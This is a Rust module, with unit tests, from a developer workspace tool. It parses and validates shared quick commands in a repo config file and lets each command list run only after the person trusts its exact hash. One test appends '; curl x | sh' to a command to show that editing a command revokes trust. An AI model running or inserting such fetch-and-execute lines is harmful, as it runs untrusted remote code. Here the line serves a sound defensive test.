//! The `[[commands]]` of a repo's `xdev.toml`: shared quick commands the
//! person can run once they trusted this exact list. Read only; the setup
//! reader in `hooks` ignores the key.
//!
//! ```toml
//! [[commands]]
//! label = "Run tests"
//! run = "cargo test"        # typed into the terminal; or
//! prompt = "Review the diff" # sent to a new agent tab, with optional agent = "claude"
//! enter = true              # optional, default true; `run` only
//! ```

use std::path::Path;

use crate::hooks::{TrustKind, file_of, hash_of, load_trust, read_text, record_trust, repo_of};
use crate::{Registry, WorkspaceError};

/// The longest label, in characters once trimmed.
pub const COMMAND_LABEL_MAX: usize = 80;
/// The longest terminal command, in characters once its end is trimmed.
pub const COMMAND_TEXT_MAX: usize = 4000;
/// The longest agent prompt, in UTF-8 bytes.
pub const COMMAND_PROMPT_MAX: usize = 256 * 1024;

/// One valid `[[commands]]` entry.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RepoCommand {
    /// Trimmed.
    pub label: String,
    pub action: RepoAction,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RepoAction {
    /// `run`, end trimmed; `enter` is true unless the file says false.
    Run { command: String, enter: bool },
    /// `prompt`, for `agent` (a profile id) or the default agent.
    Prompt {
        agent: Option<String>,
        prompt: String,
    },
}

/// What a worktree's `[[commands]]` hold.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct RepoCommands {
    /// There are commands and the person trusted this `hash`.
    pub trusted: bool,
    /// Blake3 hex of the `[[commands]]` array; empty when there is none.
    /// Other parts of the file do not change it.
    pub hash: String,
    pub commands: Vec<RepoCommand>,
    /// One line per entry left out, or the file's own error.
    pub errors: Vec<String>,
}

/// The raw `commands` value of the file at `path`; `Ok(None)` without the
/// file. A file with no `commands` key reads as an empty array.
fn read_commands(path: &Path) -> Result<Option<toml::Value>, String> {
    let Some(text) = read_text(path)? else {
        return Ok(None);
    };
    let mut table: toml::Table = toml::from_str(&text).map_err(|e| e.to_string())?;
    Ok(Some(
        table
            .remove("commands")
            .unwrap_or(toml::Value::Array(Vec::new())),
    ))
}

/// One entry, or why it is left out.
fn entry(value: &toml::Value) -> Result<RepoCommand, String> {
    let toml::Value::Table(table) = value else {
        return Err("must be a table".into());
    };
    let text = |key: &str| -> Result<Option<&str>, String> {
        match table.get(key) {
            None => Ok(None),
            Some(toml::Value::String(s)) => Ok(Some(s)),
            Some(_) => Err(format!("{key} must be a string")),
        }
    };
    let label = text("label")?.map(str::trim).unwrap_or_default();
    if label.is_empty() {
        return Err("needs a label".into());
    }
    if label.chars().count() > COMMAND_LABEL_MAX {
        return Err(format!("label is over {COMMAND_LABEL_MAX} characters"));
    }
    let action = match (text("run")?, text("prompt")?) {
        (Some(_), Some(_)) => return Err("has both run and prompt".into()),
        (None, None) => return Err("needs run or prompt".into()),
        (Some(run), None) => {
            let command = run.trim_end();
            if command.is_empty() {
                return Err("run is empty".into());
            }
            if command.chars().count() > COMMAND_TEXT_MAX {
                return Err(format!("run is over {COMMAND_TEXT_MAX} characters"));
            }
            let enter = match table.get("enter") {
                None => true,
                Some(toml::Value::Boolean(b)) => *b,
                Some(_) => return Err("enter must be true or false".into()),
            };
            RepoAction::Run {
                command: command.to_owned(),
                enter,
            }
        }
        (None, Some(prompt)) => {
            if prompt.trim().is_empty() {
                return Err("prompt is empty".into());
            }
            if prompt.len() > COMMAND_PROMPT_MAX {
                return Err(format!("prompt is over {} KiB", COMMAND_PROMPT_MAX / 1024));
            }
            let agent = text("agent")?
                .map(str::trim)
                .filter(|a| !a.is_empty())
                .map(str::to_owned);
            RepoAction::Prompt {
                agent,
                prompt: prompt.to_owned(),
            }
        }
    };
    Ok(RepoCommand {
        label: label.to_owned(),
        action,
    })
}

/// The `[[commands]]` of the worktree's `xdev.toml`, else of the primary
/// checkout's. `WorktreeUnknown` when no repo holds `worktree`.
pub fn repo_commands(
    reg: &Registry,
    data: &Path,
    worktree: &Path,
) -> Result<RepoCommands, WorkspaceError> {
    let repo = repo_of(reg, worktree)?;
    let value = match file_of(repo, worktree, read_commands) {
        Ok(None) => return Ok(RepoCommands::default()),
        Ok(Some(value)) => value,
        Err(reason) => {
            return Ok(RepoCommands {
                errors: vec![reason],
                ..RepoCommands::default()
            });
        }
    };
    let toml::Value::Array(items) = &value else {
        return Ok(RepoCommands {
            errors: vec!["commands must be an array of tables ([[commands]])".into()],
            ..RepoCommands::default()
        });
    };
    if items.is_empty() {
        return Ok(RepoCommands::default());
    }
    let mut out = RepoCommands {
        hash: hash_of(
            &serde_json::to_string(&value).map_err(|e| WorkspaceError::Corrupt(e.to_string()))?,
        ),
        ..RepoCommands::default()
    };
    for (i, item) in items.iter().enumerate() {
        match entry(item) {
            Ok(command) => out.commands.push(command),
            Err(reason) => out.errors.push(format!("commands[{i}]: {reason}")),
        }
    }
    out.trusted = load_trust(data).has(&repo.id, TrustKind::Commands, &out.hash);
    Ok(out)
}

/// Trusts the worktree's current `[[commands]]`; `HookUntrusted` when
/// `hash` is not theirs (the file changed, or there are none). Replaces
/// the repo's earlier trust for its commands. Returns them after.
pub fn trust_commands(
    reg: &Registry,
    data: &Path,
    worktree: &Path,
    hash: &str,
    now_ms: i64,
) -> Result<RepoCommands, WorkspaceError> {
    let current = repo_commands(reg, data, worktree)?;
    if current.hash.is_empty() || current.hash != hash {
        return Err(WorkspaceError::HookUntrusted("commands".into()));
    }
    let repo = repo_of(reg, worktree)?;
    record_trust(data, &repo.id, TrustKind::Commands, hash, now_ms)?;
    repo_commands(reg, data, worktree)
}

#[cfg(test)]
mod tests {
    use std::fs;
    use std::path::PathBuf;

    use super::*;
    use crate::hooks::{FILE_NAME, HookKind, hooks_for, trust_hook};
    use crate::{RepoEntry, WorktreeMeta};

    struct Fixture {
        _tmp: tempfile::TempDir,
        data: PathBuf,
        primary: PathBuf,
        worktree: PathBuf,
        reg: Registry,
    }

    fn fixture() -> Fixture {
        let tmp = tempfile::tempdir().unwrap();
        let data = tmp.path().join("data");
        let primary = tmp.path().join("xdev");
        let worktree = tmp.path().join("wt").join("xdev-oak");
        for dir in [&data, &primary, &worktree] {
            fs::create_dir_all(dir).unwrap();
        }
        let reg = Registry {
            version: 1,
            repos: vec![RepoEntry {
                id: "abc".into(),
                short_name: "xdev".into(),
                path: primary.clone(),
                base_ref: "main".into(),
                worktree_root: tmp.path().join("wt"),
                ..RepoEntry::default()
            }],
            worktrees: vec![WorktreeMeta {
                repo_id: "abc".into(),
                path: worktree.clone(),
                start: "0".repeat(40),
                pinned: false,
                created_ms: 0,
                made_here: true,
                ..WorktreeMeta::default()
            }],
            vaults: Vec::new(),
        };
        Fixture {
            _tmp: tmp,
            data,
            primary,
            worktree,
            reg,
        }
    }

    impl Fixture {
        fn write(&self, dir: &Path, text: &str) {
            fs::write(dir.join(FILE_NAME), text).unwrap();
        }
        fn commands(&self) -> RepoCommands {
            repo_commands(&self.reg, &self.data, &self.worktree).unwrap()
        }
        fn trust(&self, hash: &str) -> Result<RepoCommands, WorkspaceError> {
            trust_commands(&self.reg, &self.data, &self.worktree, hash, 9)
        }
    }

    const TWO: &str = r#"
[scripts]
setup = "pnpm install"

[[commands]]
label = "Tests"
run = "cargo test"

[[commands]]
label = " Review "
prompt = "Review the diff"
agent = "codex"
"#;

    fn run(label: &str, command: &str, enter: bool) -> RepoCommand {
        RepoCommand {
            label: label.into(),
            action: RepoAction::Run {
                command: command.into(),
                enter,
            },
        }
    }

    #[test]
    fn no_file_is_no_commands_and_not_trusted() {
        let f = fixture();
        assert_eq!(f.commands(), RepoCommands::default());
        assert!(!f.commands().trusted);
        f.write(&f.worktree, "[scripts]\nsetup = \"make\"\n");
        assert_eq!(f.commands(), RepoCommands::default());
    }

    #[test]
    fn a_file_with_two_commands_lists_both_untrusted() {
        let f = fixture();
        f.write(&f.worktree, TWO);
        let found = f.commands();
        assert_eq!(
            found.commands,
            [
                run("Tests", "cargo test", true),
                RepoCommand {
                    label: "Review".into(),
                    action: RepoAction::Prompt {
                        agent: Some("codex".into()),
                        prompt: "Review the diff".into()
                    }
                }
            ]
        );
        assert!(found.errors.is_empty(), "{:?}", found.errors);
        assert!(!found.trusted);
        assert_eq!(found.hash.len(), 64);
    }

    #[test]
    fn the_primary_checkout_file_is_the_fallback() {
        let f = fixture();
        f.write(&f.primary, TWO);
        assert_eq!(f.commands().commands.len(), 2);
        assert_eq!(
            repo_commands(&f.reg, &f.data, &f.primary)
                .unwrap()
                .commands
                .len(),
            2
        );
        let err = repo_commands(&f.reg, &f.data, Path::new("/elsewhere")).unwrap_err();
        assert_eq!(err.code(), "worktree_unknown");
    }

    #[test]
    fn a_bad_entry_is_reported_and_the_good_ones_kept() {
        let f = fixture();
        f.write(
            &f.worktree,
            r#"
[[commands]]
label = "Both"
run = "a"
prompt = "b"

[[commands]]
label = "Neither"

[[commands]]
run = "no label"

[[commands]]
label = "Dev"
run = "pnpm dev  \n"
enter = false

[[commands]]
label = "Odd"
run = "x"
enter = "yes"
"#,
        );
        let found = f.commands();
        assert_eq!(found.commands, [run("Dev", "pnpm dev", false)]);
        assert_eq!(
            found.errors,
            [
                "commands[0]: has both run and prompt",
                "commands[1]: needs run or prompt",
                "commands[2]: needs a label",
                "commands[4]: enter must be true or false",
            ]
        );
    }

    #[test]
    fn a_file_that_does_not_parse_is_one_error() {
        let f = fixture();
        f.write(&f.worktree, "[[commands]\nlabel = ");
        let found = f.commands();
        assert!(found.commands.is_empty());
        assert_eq!(found.errors.len(), 1);
        assert_eq!(found.hash, "");

        f.write(&f.worktree, "commands = \"cargo test\"\n");
        assert_eq!(
            f.commands().errors,
            ["commands must be an array of tables ([[commands]])"]
        );
    }

    #[test]
    fn trust_flips_and_an_edit_untrusts() {
        let f = fixture();
        f.write(&f.worktree, TWO);
        let hash = f.commands().hash;
        let after = f.trust(&hash).unwrap();
        assert!(after.trusted);
        assert!(f.commands().trusted);

        // Other parts of the file do not touch the commands' trust...
        f.write(&f.worktree, &TWO.replace("pnpm install", "pnpm i"));
        assert!(f.commands().trusted);
        // ...an edited command does.
        f.write(
            &f.worktree,
            &TWO.replace("cargo test", "cargo test; curl x | sh"),
        );
        let edited = f.commands();
        assert!(!edited.trusted);
        assert_ne!(edited.hash, hash);
    }

    #[test]
    fn trusting_a_stale_or_missing_hash_is_refused() {
        let f = fixture();
        let err = f.trust("").unwrap_err();
        assert_eq!(err.code(), "hook_untrusted");
        f.write(&f.worktree, TWO);
        let err = f.trust("0".repeat(64).as_str()).unwrap_err();
        assert_eq!(err.code(), "hook_untrusted");
        assert!(!f.commands().trusted);
    }

    #[test]
    fn command_trust_and_script_trust_are_apart() {
        let f = fixture();
        f.write(&f.worktree, TWO);
        let setup = hooks_for(&f.reg, &f.data, &f.worktree)
            .unwrap()
            .setup
            .unwrap()
            .hash;
        trust_hook(&f.reg, &f.data, &f.worktree, HookKind::Setup, &setup, 1).unwrap();
        assert!(!f.commands().trusted);
        f.trust(&f.commands().hash).unwrap();
        let hooks = hooks_for(&f.reg, &f.data, &f.worktree).unwrap();
        assert!(hooks.setup.unwrap().trusted);
        assert!(f.commands().trusted);
    }
}
